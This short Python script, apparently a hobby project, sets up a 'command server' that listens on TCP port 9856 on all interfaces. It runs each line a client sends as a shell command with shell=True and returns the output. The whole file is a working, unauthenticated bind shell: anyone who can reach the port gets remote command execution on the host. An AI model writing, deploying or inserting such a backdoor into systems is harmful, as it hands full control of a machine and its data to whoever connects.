import socket
import subprocess

HOST = ''
PORT = 9856

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind((HOST,PORT))
s.listen()
conn, addr = s.accept()
print("{} Conneted with back port {}".format(addr[0], addr[1]))
conn.sendall("Just a Command server Developed By KLINTON\n\n $ ".encode())
while True: 
 data = conn.recv(1024)
 if not data:
  break
 else:
  data = data.decode()
  data = data.strip()
  print("Echo > {}".format(data))
  if(data == "quit"):
   break
  else: 
   #Using subprocess API to access SHELL 
   proc = subprocess.Popen(data, stdout=subprocess.PIPE, shell=True, stderr=subprocess.STDOUT)
   (out, err)  = proc.communicate()
   data = "\n" + out.decode()
   data = data + "\r\n$ "
   conn.sendall(data.encode())
s.close()